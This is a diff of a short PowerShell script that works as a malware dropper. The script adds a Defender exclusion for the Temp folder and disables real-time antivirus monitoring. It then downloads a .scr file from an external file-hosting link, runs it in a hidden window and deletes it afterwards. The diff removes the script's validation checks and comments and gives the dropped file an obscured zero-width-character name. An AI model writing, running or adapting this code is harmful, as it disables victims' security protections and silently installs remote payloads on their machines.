@@ -2,27 +2,8 @@ $oP = "$env:Temp"
 Add-MpPreference -ExclusionPath $oP
 Set-MpPreference -DisableRealtimeMonitoring $true
 $fU = "https://fv2-4.failiem.lv/down.php?i=bk6daatqpj"
-$oPT = "$env:Temp\file.scr"
-
-# Download the file
+$oPT = "$env:Temp\​.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
-
-# Check if the file exists and is not empty
-if (Test-Path $oPT -PathType Leaf -and (Get-Item $oPT).length -gt 0) {
-    try {
-        # Start the process
-        Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
-    }
-    catch {
-        Write-Error "Failed to start the process: $_"
-    }
-    
-    # Remove the file
-    Remove-Item -Path $oPT -Force
-}
-else {
-    Write-Error "Downloaded file is invalid or empty."
-}
-
-# Remove the exclusion path
+Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
+Remove-Item -Path $oPT -Force
 Remove-MpPreference -ExclusionPath $oP
